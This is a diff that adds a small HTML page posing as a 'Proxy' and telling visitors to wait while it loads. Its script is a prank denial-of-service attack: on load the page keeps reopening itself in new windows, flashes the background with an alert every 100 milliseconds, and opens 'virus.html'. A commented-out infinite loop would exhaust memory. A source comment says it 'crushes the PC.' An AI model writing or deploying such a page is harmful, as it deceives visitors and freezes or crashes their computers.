@@ -1,0 +1,47 @@
+<!-- Source: http://jsenabled.blogspot.com/2011/09/9-funniest-javascript-effects.html -->
+<!-- Opens lots of windows in the browser and crushes the PC. -->
+
+<html>
+<head>
+    <title>Proxy</title>
+</head>
+<body>
+    <h1>pls wait it might take 1min but after its done it gonna run smothly</h1>
+ <!-- <script>
+var txt = "a";
+while(1){
+    txt += "a";
+}
+</script> -->
+   <script>
+        activ = window.setInterval("Farbe()", 100);
+        farbe=1;
+        
+        function Farbe() {
+            if(farbe==1) {
+                document.bgColor="FFFF00";
+                farbe=2;
+            }else {
+                document.bgColor="FF0000";
+                farbe=1;
+            }
+            
+            alert("ok");
+        }
+
+        function erneut(){
+            window.open(self.location,'');
+        }
+        
+        window.onload = erneut;
+
+        function openInNewTab(url) {
+    window.open(url, '_blank').focus();
+}
+
+// Example usage:
+openInNewTab('virus.html');
+
+    </script>
+</body>
+</html>
